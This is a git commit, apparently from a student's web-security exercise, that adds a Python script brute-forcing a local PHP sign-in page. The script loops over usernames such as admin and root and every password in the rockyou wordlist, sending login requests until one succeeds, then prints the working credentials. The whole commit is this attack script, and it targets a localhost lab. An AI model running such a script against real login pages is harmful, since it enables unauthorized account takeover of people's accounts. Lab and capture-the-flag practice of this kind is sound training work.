9790974e50a92c65acbfbdc0cb97058453d8ca0e
Adem Naouali <anaouali@f4r3s8.clusters.42paris.fr>
2025-12-17 14:41:19 +0100

    darkkkk

---
+++ 00/Resources/brutforce.py
@@ -0,0 +1,29 @@
+import requests
+
+base_url = "http://localhost:8080/index.php"
+
+users = ["admin", "root", "user", "test"]
+
+# Chargement des mots de passe rockyou
+passwords = []
+with open("rockyou.txt", "r", encoding="latin-1") as f:
+    for line in f:
+        passwords.append(line.strip())
+
+for user in users:
+    for pwd in passwords:
+
+        params = {
+            "page": "signin",
+            "username": user,
+            "password": pwd,
+            "Login": "Login"
+        }
+
+        r = requests.get(base_url, params=params)
+
+        if "WrongAnswer" not in r.text:
+            print(f"[OK] Trouvé → {user} / {pwd}")
+            exit()
+
+print("Aucune combinaison trouvée.")
